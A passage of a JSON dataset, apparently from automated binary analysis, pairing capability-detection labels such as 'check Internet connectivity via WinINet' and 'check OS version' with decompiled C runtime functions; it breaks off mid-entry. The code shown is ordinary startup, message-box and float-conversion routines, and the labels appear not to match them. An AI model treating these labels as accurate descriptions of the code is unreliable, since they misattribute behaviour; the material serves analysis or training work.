(*_sym.imp.KERNEL32.dll_DecodePointer)(*0x4570ec);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x4570e8);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.00425225();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.00425225();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x4570ec);\n                        piVar2 = (*pcVar1)(*0x4570e8);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x434198;\n            while (*(unaff_EBP + -0x1c) < 0x4341a4) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x4341a8;\n        while (*(unaff_EBP + -0x20) < 0x4341ac) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00426179(8);\n    }\n    return;\n}\n",
        "token_count": 1008
    },
    "0042bd14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042bd14(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00426179(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0042bf6f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042bf6f(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.00425225();\n    var_14h = 0;\n    if (*0x4459d8 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MessageBoxW\"), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0042c0cc;\n        *0x4459d8 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, \"GetActiveWindow\");\n        *0x4459dc = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetLastActivePopup\");\n        *0x4459e0 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetUserObjectInformationW\");\n        *0x4459e8 = (*pcVar4)(uVar3);\n        if (*0x4459e8 != 0) {\n            uVar3 = (*pcVar6)(iVar1, \"GetProcessWindowStation\");\n            *0x4459e4 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x4459e4 == var_18h) || (*0x4459e8 == var_18h)) {\ncode_r0x0042c07b:\n        if ((((*0x4459dc != var_18h) && (pcVar4 = (*pcVar6)(*0x4459dc),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x4459e0 != var_18h && (pcVar4 = (*pcVar6)(*0x4459e0),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x4459e4);\n        pcVar5 = (*pcVar6)(*0x4459e8);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0042c07b;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x4459d8);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0042c0cc:\n    fcn.0041e0a1(unaff_EBX);\n    return;\n}\n",
        "token_count": 946
    },
    "0042f19d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042f19d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    fcn.0041e8dd(arg_10h);\n    var_14h = fcn.004300f2(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0042f64e(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0042f1f6:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0042f236;\n        }\n        if (iVar1 != 2) {\ncode_r0x0042f228:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0042f236;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0042f228;\n        goto code_r0x0042f1f6;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0042f236:\n    fcn.0041e0a1(unaff_EBX);\n    return;\n}\n",
        "token_count": 511
    },
    "0042f245": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042f245(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    fcn.0041e8dd(arg_10h);\n    var_14h = fcn.004300f2(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0042fba1(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0042f29e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0042f2de;\n        }\n        if (iVar1 != 2) {\ncode_r0x0042f2d0:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0042f2de;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0042f2d0;\n        goto code_r0x0042f29e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0042f2de:\n    fcn.0041e0a1(unaff_EBX);\n    return;\n}\n",
        "token_count": 515
    },
    "0042f64e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0042f64e(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = str.5_v_[1];\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = str.5_v_[0] + L'\\xffffffff';\n        iVar14 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0042f792;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0042f799;\ncode_r0x0042f792:\n                        do {\n                            bVar6 = true;\ncode_r0x0042f799:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0042f7a7;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0042f7a7:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x444784 - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x444784 < iVar14) {\n                if (iVar14 < *0x444780) {\n                    iVar14 = iVar14 + str.5_v_[3];\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = str.5_v_[3] + *0x444780;\n                }\n                goto code_r0x0042fb52;\n            }\n            iVar13 = *0x444784 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = str.5_v_[0] + L'\\xffffffff';\n            iVar13 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0042f946;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0042f946:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = str.5_v_[1] + L'\\x01' + (str.5_v_[1] + L'\\x01' >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0042fb52:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar15;\n    }\n    fcn.0041e0a1(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3262
    },
    "0042fba1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0042fba1(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x4447a4;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x4447a0 + -1;\n        iVar14 = *0x4447a0 + (*0x4447a0 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x4447a0 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0042fce5;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0042fcec;\ncode_r0x0042fce5:\n                        do {\n                            bVar6 = true;\ncode_r0x0042fcec:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0042fcfa;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0042fcfa:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x44479c - *0x4447a0) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x44479c < iVar14) {\n                if (iVar14 < *0x444798) {\n                    iVar14 = iVar14 + *0x4447ac;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x4447a4 + (*0x4447a4 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x4447a4 + (*0x4447a4 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x4447ac + *0x444798;\n                }\n                goto code_r0x004300a5;\n            }\n            iVar13 = *0x44479c - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x4447a0 + -1;\n            iVar13 = *0x4447a0 + (*0x4447a0 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x4447a0 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0042fe99;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0042fe99:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x4447a4 + 1 + (*0x4447a4 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x004300a5:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x4447a8 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x4447a8 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.0041e0a1(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3248
    },
    "004300f2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
